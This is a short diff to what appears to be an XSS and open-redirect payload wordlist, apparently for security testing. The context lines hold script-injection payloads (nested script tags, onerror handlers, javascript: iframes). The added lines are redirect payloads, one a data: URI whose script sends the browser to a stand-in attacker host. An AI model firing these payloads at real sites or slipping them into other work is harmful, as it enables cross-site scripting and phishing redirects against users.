@@ -10,3 +10,5 @@
 <script<script>xss</script>>
 <script>teste</script>iframe src="javascript:alert('xss')">teste
 <<img src=a onerror="alert(1)">iframe src="javascript:alert('xss');">
+redirect= javascript:alert(1)
+redirect=data:text/html,<script>document.location='http://www.attacker-site.com/';</script>
